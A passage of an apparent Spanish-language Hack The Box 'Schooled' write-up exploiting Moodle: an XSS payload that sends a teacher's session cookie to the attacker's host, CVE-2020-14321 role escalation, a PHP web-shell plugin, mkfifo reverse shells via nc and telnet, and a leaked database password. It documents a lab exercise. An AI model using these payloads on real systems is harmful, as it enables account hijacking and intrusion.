    &lt;p&gt;&lt;code&gt;http://moodle.schooled.htb/moodle/enrol/index.php?id=5&lt;/code&gt;&lt;/p&gt;

    &lt;p&gt;El &lt;strong&gt;ID&lt;/strong&gt; va del &lt;strong&gt;5&lt;/strong&gt; al &lt;strong&gt;2&lt;/strong&gt;, el n√∫mero &lt;strong&gt;1&lt;/strong&gt; nos redirecciona a la p√°gina principal donde est√°n todos los cursos.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code&gt;http://moodle.schooled.htb/moodle/calendar/view.php?view=month&lt;/code&gt;&lt;/p&gt;

    &lt;p&gt;Tiene la opci√≥n de variar entre &lt;strong&gt;d√≠a&lt;/strong&gt;, &lt;strong&gt;mes&lt;/strong&gt; y &lt;strong&gt;a√±o&lt;/strong&gt;, pero solo &lt;strong&gt;mes&lt;/strong&gt; (month) funciona.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code&gt;http://moodle.schooled.htb/moodle/calendar/view.php?view=month&amp;amp;time=1614556800&lt;/code&gt;&lt;/p&gt;

    &lt;p&gt;Podemos ver el calendario de varios meses, ya que &lt;strong&gt;time&lt;/strong&gt; depende del mes que escojamos.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Entonces, con esto en mente podr√≠amos probar &lt;strong&gt;inyecci√≥n SQL&lt;/strong&gt; (no va por ac√°) de varias maneras, validando r√°pidamente que no existan m√°s IDs (cursos) tenemos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù≠ for id in $(seq 0 20); do echo -n &quot;ID: $id -&amp;gt; Status Code: &quot;; curl -s -I --cookie &quot;MoodleSession=2a9js25d3usf0dv3u5r27c21nn&quot; http://moodle.schooled.htb/moodle/enrol/index.php?id=$id | grep &quot;HTTP/1.1&quot; | awk '{print $2}'; done

ID: 0 -&amp;gt; Status Code: 404
ID: 1 -&amp;gt; Status Code: 303
ID: 2 -&amp;gt; Status Code: 200
ID: 3 -&amp;gt; Status Code: 200
ID: 4 -&amp;gt; Status Code: 200
ID: 5 -&amp;gt; Status Code: 200
ID: 6 -&amp;gt; Status Code: 404
ID: 7 -&amp;gt; Status Code: 404
ID: 8 -&amp;gt; Status Code: 404
ID: 9 -&amp;gt; Status Code: 404
ID: 10 -&amp;gt; Status Code: 404
ID: 11 -&amp;gt; Status Code: 404
ID: 12 -&amp;gt; Status Code: 404
ID: 13 -&amp;gt; Status Code: 404
ID: 14 -&amp;gt; Status Code: 404
ID: 15 -&amp;gt; Status Code: 404
ID: 16 -&amp;gt; Status Code: 404
ID: 17 -&amp;gt; Status Code: 404
ID: 18 -&amp;gt; Status Code: 404
ID: 19 -&amp;gt; Status Code: 404
ID: 20 -&amp;gt; Status Code: 404
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora probando a registrarnos encontramos un nuevo dominio:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335page80_moodleSignup.png&quot; alt=&quot;335page80_moodleSignup&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code&gt;student.schooled.htb&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Pero agreg√°ndolo al archivo &lt;code&gt;/etc/hosts&lt;/code&gt; y validando su contenido nos damos cuenta de que responde con el mismo de &lt;code&gt;schooled.htb&lt;/code&gt;. As√≠ que cambiamos nuestro email con ese dominio y nos permite registrarnos:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335page80_moodleDash.png&quot; alt=&quot;335page80_moodleDash&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos algo interesante a la izquierda, &lt;strong&gt;Private files&lt;/strong&gt;, ech√°ndole un ojo nos permite subir archivos, podemos hacerlo mediante un URL:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335page80_moodlePrivFiles.png&quot; alt=&quot;335page80_moodlePrivFiles&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Probando a que el servicio lea un archivo que est√© alojado en nuestra m√°quina (servidor) obtenemos respuesta, pero despu√©s de varios intentos no logramos nada relevante. Dando vueltas encontramos que podemos modificar nuestra imagen de perfil. Intentamos lo mismo que antes e incluso subir una imagen con metadatos &lt;code&gt;PHP&lt;/code&gt; o cambi√°ndole los magic bytes a un script para que el sistema crea que es un &lt;code&gt;JPEG&lt;/code&gt;, pero nada, no obtenemos respuesta.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://lanzt.github.io/blog/htb/HackTheBox-Magic&quot;&gt;&lt;strong&gt;INFO metadata y cambiar magic bytes&lt;/strong&gt;. (En la mitad del post esta)&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Entrando en &lt;strong&gt;Site home&lt;/strong&gt; nos damos cuenta de algo interesante, el curso &lt;strong&gt;Mathematics&lt;/strong&gt; es el √∫nico al cual podemos ‚Äúanotarnos‚Äù como estudiantes:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335page80_moodleMathEnrol.png&quot; alt=&quot;335page80_moodleMathEnrol&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Despu√©s de anotarnos (enrolarnos) nos redirige a:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;http://moodle.schooled.htb/moodle/course/view.php?id=5
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335page80_moodleMathView.png&quot; alt=&quot;335page80_moodleMathView&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si nos movemos a &lt;strong&gt;Annoucements&lt;/strong&gt; tenemos 2 mensajes:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335page80_moodleMathAnnoun.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Fij√°ndonos en el primero tenemos informaci√≥n interesante:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335page80_moodleMathAnn_reminder.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h1 id=&quot;explotacion&quot;&gt;Explotaci√≥n &lt;a href=&quot;#explotacion&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h2 id=&quot;teacher-cookie-hijacking&quot;&gt;Jugamos con la interacci√≥n del profesor para robarle su cookie &lt;a href=&quot;#teacher-cookie-hijacking&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;üë®‚Äçüè´ &lt;strong&gt;&lt;em&gt;Students who do not set their &lt;u&gt;MoodleNet profiles&lt;/u&gt; will be removed from the course before the course is due to start and &lt;u&gt;I will be checking all students who are enrolled on this course&lt;/u&gt;&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Nos indica que el usuario &lt;strong&gt;Manuel Phillips&lt;/strong&gt; (profesor) estar√° revisando que todos los estudiantes que se unan a su curso tengan habilitado o modificado en su perfil (estudiante) algo llamado &lt;strong&gt;MoodleNet&lt;/strong&gt; (que es una red social para educadores seg√∫n la &lt;a href=&quot;https://moodle.com/es/moodlenet/&quot;&gt;web oficial&lt;/a&gt;) :O&lt;/p&gt;

&lt;p&gt;Opa, esto esta interesante, ya que dependiendo el campo el cual debamos modificar podr√≠amos pensar en robarle la &lt;code&gt;cookie&lt;/code&gt; al profesor, ya que estar√≠a verificando nuestro perfil (&lt;strong&gt;siempre y cuando estemos enrolados en su curso&lt;/strong&gt;), por lo tanto esta entrando en el campo (de nuestro perfil) y validar√≠a su contenido.&lt;/p&gt;

&lt;p&gt;Veamos, vamos a nuestro perfil arriba a la derecha, damos clic en &lt;strong&gt;edit profile&lt;/strong&gt; y vemos:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335page80_moodleProfile_mooNet.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Es un campo de texto, pues vayamos a la fija e intentemos que lea algo de nuestro servidor a ver si realmente el profesor esta validando el input:&lt;/p&gt;

&lt;p&gt;Levantamos servidor web:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù≠ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y en el campo &lt;strong&gt;MoodleNet&lt;/strong&gt; escribimos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;&amp;lt;script src=&quot;http://10.10.14.11:8000/serompe.oque&quot;&amp;gt;&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Guardamos los cambios‚Ä¶ Y si revisamos nuestro servidor:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù≠ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.234 - - [12/Apr/2021 25:25:25] code 404, message File not found
10.10.10.234 - - [12/Apr/2021 25:25:25] &quot;GET /serompe.oque HTTP/1.1&quot; 404 -
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Entonces, esta perfecto, sabemos que el profesor esta validando ese campo, ahora podemos proceder a robarle su cookie, para esto simplemente indicamos en el campo &lt;code&gt;MoodleNet&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;&amp;lt;script&amp;gt;document.write('&amp;lt;img src=&quot;http://10.10.14.11:8000/serompe.oque?cookie=' + document.cookie + '&quot;&amp;gt;')&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Esto va a intentar subir una imagen (como antes), solo que como la imagen ‚Äúesta‚Äù en nuestro servidor, intentara cargarla, peeeero adem√°s le concatenamos una variable llamada &lt;code&gt;cookie&lt;/code&gt; que guardara la sesi√≥n del usuario que ingrese al campo (con &lt;code&gt;document.cookie&lt;/code&gt;), o sea, obtendr√≠amos la cookie del profesor que esta validando el campo.&lt;/p&gt;

&lt;p&gt;Guardamos yyyyyyyyyy en nuestro servidor obtenemos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù≠ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.234 - - [12/Apr/2021 25:25:25] code 404, message File not found
10.10.10.234 - - [12/Apr/2021 25:25:25] &quot;GET /serompe.oque?cookie=MoodleSession=boejsdgppi3r50rahsn0tcnqji HTTP/1.1&quot; 404 -
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;PERFECTOOOOOOOOOOOO, tenemos la petici√≥n con una cookie, pues probemos a cambiar la nuestra por esa:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335page80_moodle_changeCookie.png&quot; alt=&quot;335page80_moodle_changeCookie&quot; /&gt;&lt;/p&gt;

&lt;p&gt;VAMONOOOOOOOOOOOOOOOOOOS, somos el usuario &lt;code&gt;Manuel Phillips&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;En su perfil vemos un correo y un dominio, podemos guardarlos por si algo. Adem√°s sabemos la estructura de como est√°n (suponemos) guardados los usuarios (o profesores) del servidor: &lt;code&gt;apellido_nombre@dominio&lt;/code&gt;.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;CVE-2020-14321&quot;&gt;Divagando y explotando la versi√≥n de &lt;u&gt;Moodle&lt;/u&gt; &lt;a href=&quot;#CVE-2020-14321&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Viendo que podemos hacer ahora como profesor, leyendo cositas y probando otras, finalmente en la web encontramos un PoC haciendo alusi√≥n al CVE &lt;a href=&quot;https://moodle.org/mod/forum/discuss.php?d=407393&quot;&gt;CVE-2020-14321&lt;/a&gt; que se ve interesante:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=BkEInFI4oIU&quot;&gt;Youtube - Moodle RCE &lt;strong&gt;CVE-2020-14321&lt;/strong&gt; POC&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335google_cve_moodle.png&quot; alt=&quot;335google_cve_moodle&quot; /&gt;&lt;/p&gt;

&lt;p&gt;La vulnerabilidad se basa en que un &lt;strong&gt;profesor&lt;/strong&gt; puede asignarse a s√≠ mismo o a otros el rol de &lt;strong&gt;manager&lt;/strong&gt; dentro de un curso, &lt;u&gt;lo que le dar√≠a poder de manipular el curso como **administrador**&lt;/u&gt; üòÆ&lt;/p&gt;

&lt;p&gt;Entonces, si indagamos un poco encontramos el &lt;a href=&quot;https://github.com/HoangKien1020/CVE-2020-14321&quot;&gt;PoC oficial&lt;/a&gt; de la persona que encontr√≥ la vulnerabilidad:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Kien Hoang&lt;/strong&gt; - &lt;a href=&quot;https://github.com/HoangKien1020/CVE-2020-14321&quot;&gt;https://github.com/HoangKien1020/CVE-2020-14321&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ya tenemos todo lo que necesitamos, as√≠ que sigamos los mismos pasos que el video:&lt;/p&gt;

&lt;p&gt;&lt;span style=&quot;color: yellow;&quot;&gt;&lt;u&gt;1.&lt;/u&gt; &lt;/span&gt;Nos logeamos como profesor, pero como tenemos la cookie de uno, tamos bien.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335page80_moodle_changeCookie.png&quot; alt=&quot;335page80_moodle_changeCookie&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;span style=&quot;color: yellow;&quot;&gt;2. &lt;/span&gt;Vamos al curso del cual somos profesor, en nuestro caso &lt;strong&gt;mathematics (Maths)&lt;/strong&gt;, damos clic en &lt;strong&gt;Participants&lt;/strong&gt; y despu√©s en &lt;strong&gt;Enrol users&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335page80_moodle_cve_stepsToEnrol.png&quot; alt=&quot;335page80_moodle_cve_stepsToEnrol&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335page80_moodle_cve_enrolUsers.png&quot; alt=&quot;335page80_moodle_cve_enrolUsers&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Estando en esa ventana seleccionamos al usuario &lt;code&gt;Lianne Carter&lt;/code&gt; para enrolarla al curso (ya jugaremos con burp), pero, ¬øpor qu√© ella? Bueno si recordamos cuando encontramos los profesores en la web, estaba &lt;strong&gt;Lianne Carter&lt;/strong&gt; como &lt;u&gt;manager del sitio&lt;/u&gt;, as√≠ que nos aprovecharemos para cambiar unos valores y enrolarla, pero como administradora del curso (si no, se enrolar√≠a como estudiante :P).&lt;/p&gt;

&lt;p&gt;Interceptamos mediante &lt;strong&gt;BurpSuite&lt;/strong&gt; la petici√≥n y damos clic en &lt;strong&gt;Enrol users&lt;/strong&gt;, obtenemos:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335burp_moodle_cve_enrolUser_lianne.png&quot; alt=&quot;335burp_moodle_cve_enrolUser_lianne&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Dos campos importantes:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code&gt;userlist[]=&lt;/code&gt; (ID del usuario).&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;roletoassign=&lt;/code&gt; (Rol a asignar, &lt;strong&gt;1 es manager&lt;/strong&gt; seg√∫n &lt;a href=&quot;https://docs.moodle.org/all/es/Gestionar_roles&quot;&gt;esta documentaci√≥n&lt;/a&gt;).&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335google_moodle_roles.png&quot; alt=&quot;335google_moodle_roles&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As√≠ que en vez de &lt;code&gt;5&lt;/code&gt; colocamos &lt;code&gt;1&lt;/code&gt; y enviamos la petici√≥n.&lt;/p&gt;

&lt;p&gt;Pero validando en la web no vemos que &lt;strong&gt;Lianne&lt;/strong&gt; sea &lt;strong&gt;manager&lt;/strong&gt; a√∫n:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;Lianne Carter - carter_lianne@staff.schooled.htb - Student
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si modificamos al usuario &lt;strong&gt;Manuel (ID 24)&lt;/strong&gt; (con el que estamos) para que tambi√©n tenga el rol de &lt;strong&gt;manager&lt;/strong&gt; obtenemos en la web:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;Lianne Carter - carter_lianne@staff.schooled.htb - Manager, Student
...
Manuel Phillips - phillips_manuel@staff.schooled.htb - Manager, Teacher
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Listos, ahora si podemos seguir con el &lt;strong&gt;PoC&lt;/strong&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;&lt;span style=&quot;color: yellow;&quot;&gt;3. &lt;/span&gt;Obtenemos una sesi√≥n en &lt;em&gt;Moodle&lt;/em&gt; como &lt;strong&gt;Lianne&lt;/strong&gt; (manager) en el curso.&lt;/p&gt;

&lt;p&gt;Damos clic en el nombre de &lt;strong&gt;Lianne&lt;/strong&gt; y estando en su perfil vamos a &lt;code&gt;Log in as&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335page80_moodle_cve_lianne_logIN.png&quot; alt=&quot;335page80_moodle_cve_lianne_logIN&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y ahora somos &lt;strong&gt;Lianne&lt;/strong&gt; y tenemos acceso a un nuevo apartado, &lt;code&gt;Site administration&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335page80_moodle_cve_lianne_siteAdmin.png&quot; alt=&quot;335page80_moodle_cve_lianne_siteAdmin&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;span style=&quot;color: yellow;&quot;&gt;4. &lt;/span&gt;Vamos a instalar un &lt;strong&gt;plugin&lt;/strong&gt; malicioso.&lt;/p&gt;

&lt;p&gt;Entramos al sitio administrativo y seleccionamos &lt;code&gt;Plugins&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335page80_moodle_cve_lianne_plugins.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora damos clic en &lt;code&gt;Install plugins&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335page80_moodle_cve_lianne_installPlugin.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nos pide un archivo &lt;code&gt;zip&lt;/code&gt; para instalar el plugin. Volviendo al repo vemos que nos provee con un comprimido llamado &lt;code&gt;rce.zip&lt;/code&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/HoangKien1020/Moodle_RCE/blob/master/rce.zip&quot;&gt;https://github.com/HoangKien1020/Moodle_RCE/blob/master/rce.zip&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Lo descargamos y validando su contenido tenemos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù≠ tree rce
rce
‚îú‚îÄ‚îÄ lang
‚îÇ¬†¬† ‚îî‚îÄ‚îÄ en
‚îÇ¬†¬†     ‚îî‚îÄ‚îÄ block_rce.php
‚îî‚îÄ‚îÄ version.php
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;üî¶ &lt;code&gt;block_rce.php&lt;/code&gt; es el archivo que nos permite ejecutar comandos en el sistema, todo mediante la variable &lt;code&gt;cmd&lt;/code&gt; que recibe en la petici√≥n &lt;code&gt;GET&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;‚ù≠ cat rce/lang/en/block_rce.php 
&amp;lt;?php system($_GET['cmd']); ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;üî¶ &lt;code&gt;version.php&lt;/code&gt; permite la generaci√≥n del plugin y llama a nuestro archivo malicioso:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;‚ù≠ cat rce/version.php 
&amp;lt;?php 
$plugin-&amp;gt;version = 2020061700;
$plugin-&amp;gt;component = 'block_rce';
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Listos, para subir el archivo &lt;code&gt;zip&lt;/code&gt;, seleccionamos el objeto y damos clic en &lt;strong&gt;&lt;u&gt;Install plugin from the ZIP file&lt;/u&gt;&lt;/strong&gt;, recibimos:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335page80_moodle_cve_lianne_installPluginFromZIP.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Damos clic en &lt;strong&gt;&lt;u&gt;Continue&lt;/u&gt;&lt;/strong&gt; y seg√∫n las indicaciones del &lt;strong&gt;PoC&lt;/strong&gt; simplemente debemos dirigirnos a la siguiente ruta:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;&amp;lt;domain&amp;gt;/blocks/rce/lang/en/block_rce.php
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y concatenarle el comando que queramos ejecutar con la variable &lt;code&gt;cmd&lt;/code&gt;, modific√°ndola quedar√≠a as√≠ para ejecutar el comando &lt;code&gt;id&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=id
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335page80_moodle_cve_lianne_pluginInstalled_RCE.png&quot; alt=&quot;335page80_moodle_cve_lianne_pluginInstalled_RCE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;PERFECTOOOOOOOOOOOOOOOOOOOOOOo tenemos ejecuci√≥n remota de comandossadflakjwlekfjlkasd (: Intentemos conseguir una reverse Shell‚Ä¶&lt;/p&gt;

&lt;p&gt;Nos ponemos en escucha con &lt;strong&gt;netcat&lt;/strong&gt;: &lt;code&gt;nc -lvp 4433&lt;/code&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://sentrywhale.com/documentation/reverse-shell&quot;&gt;Reverse Shells Others and &lt;strong&gt;FreeBSD&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Probando estas dos sentencias lo logramos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i |telnet 10.10.14.11 4433 &amp;gt; /tmp/f
http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i |nc 10.10.14.11 4433 &amp;gt; /tmp/f
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y Listones, ya estariamos dentro. Intentando hacer tratamiento de la &lt;code&gt;TTY&lt;/code&gt; o al menos tener una Shell m√°s bonita, tenemos problemas y no lo logramos :( As√≠ que enumeremos a ver como podemos movernos a algo lindo.&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;Como vimos, el proceso es muuuuy largo y tedioso de hacer manual, por lo tanto me cree dos scripts, uno enfocado 100% en la m√°quina, con √©l nos agrega la l√≠nea en el perfil de &lt;strong&gt;Moodle&lt;/strong&gt; y tambi√©n toooooooooooodo el tema del &lt;strong&gt;RCE&lt;/strong&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/schooled/moodle_schooled_RCE.py&quot;&gt;moodle_schooled_RCE.py&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;El otro explota directamente el &lt;strong&gt;CVE&lt;/strong&gt;, por lo que funciona contra cualquier &lt;code&gt;Moodle 3.9&lt;/code&gt; con el que tengas credenciales de un profesor (o una cookie :P)&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/50180&quot;&gt;exploit.db - &lt;strong&gt;Moodle 3.9&lt;/strong&gt; Remote Code Execution (RCE) (Authenticated)&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h1 id=&quot;movimiento-lateral-jamie&quot;&gt;&lt;u&gt;MySQL&lt;/u&gt;: www -&amp;gt; jamie &lt;a href=&quot;#movimiento-lateral-jamie&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;Enumerando los usuarios del sistema tenemos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;ls -la /home
lrwxr-xr-x  1 root  wheel  8 Feb 26 22:45 /home -&amp;gt; usr/home
ls -la /usr/home
total 26
drwxr-xr-x   4 root   wheel   4 Mar 16 06:33 .
drwxr-xr-x  16 root   wheel  16 Feb 26 22:46 ..
drwx------   2 jamie  jamie  11 Feb 28 18:13 jamie
drwx------   5 steve  steve  14 Mar 17 14:05 steve
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;jamie&lt;/strong&gt; y &lt;strong&gt;steve&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Leyendo archivos de la ruta donde salimos encontramos la configuraci√≥n de la base de datos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;pwd
/usr/local/www/apache24/data/moodle
cat config.php
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;?php  // Moodle configuration file

unset($CFG);
global $CFG;
$CFG = new stdClass();

$CFG-&amp;gt;dbtype    = 'mysqli';
$CFG-&amp;gt;dblibrary = 'native';
$CFG-&amp;gt;dbhost    = 'localhost';
$CFG-&amp;gt;dbname    = 'moodle';
$CFG-&amp;gt;dbuser    = 'moodle';
$CFG-&amp;gt;dbpass    = 'PlaybookMaster2020';
$CFG-&amp;gt;prefix    = 'mdl_';
$CFG-&amp;gt;dboptions = array (
  'dbpersist' =&amp;gt; 0,
  'dbport' =&amp;gt; 3306,
  'dbsocket' =&amp;gt; '',
  'dbcollation' =&amp;gt; 'utf8_unicode_ci',
);

$CFG-&amp;gt;wwwroot   = 'http://moodle.schooled.htb/moodle';
$CFG-&amp;gt;dataroot  = '/usr/local/www/apache24/moodledata';
$CFG-&amp;gt;admin     = 'admin';

$CFG-&amp;gt;directorypermissions = 0777;

require_once(__DIR__ . '/lib/setup.php');

// There is no php closing tag in this file,
// it is intentional because it prevents trailing whitespace problems!
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;moodle&lt;/strong&gt; -&amp;gt; &lt;strong&gt;PlaybookMaster2020&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Buscando la manera de jugar con &lt;code&gt;MySQL&lt;/code&gt; con esta terminal encontramos las lindas herramientas:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;find / -name mysqlshow
/usr/local/bin/mysqlshow
&lt;/code&gt;&lt;/pre&gt;

